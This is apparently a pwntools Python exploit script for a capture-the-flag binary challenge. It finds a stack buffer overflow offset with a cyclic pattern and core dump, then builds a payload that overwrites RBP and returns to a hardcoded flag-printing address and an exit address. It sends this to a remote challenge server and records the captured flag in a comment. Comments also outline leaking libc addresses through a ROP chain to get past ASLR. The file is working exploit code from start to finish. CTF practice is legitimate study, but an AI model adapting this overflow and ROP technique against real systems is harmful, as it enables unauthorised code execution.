from pwn import *
from struct import pack

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'


def clean(x): return x.split('\n')[1:-2]

pad = lambda x: x + padding*(8-len(x))

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call puts function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

elf = ELF('./chall')
context.binary = './chall'

##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(1024)
r.recvline()
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
rsp = core.rsp
offset = core.read(rsp, 4)
offset = cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

# Find manually
crashOffset = offset

# 0x7fffffffd7e8 is just some random value in stack space, just so RBP is valid
junk = nops*(crashOffset - 8) + p64(0x7fffffffd7e8)  # Override RBP

exitret = p64(0x401167)
flagret = p64(0x401156)

##########################################################################
# Demo ==> 
##########################################################################

payload = b''.join([junk,
                    flagret,
                    exitret])

# r = elf.process()
r = remote('challs.xmas.htsp.ro', 12006)

print(r.readline())
print(r.clean())

r.sendline(payload)
r.readline()
r.readline()
# X-MAS{700_much_5n0000w}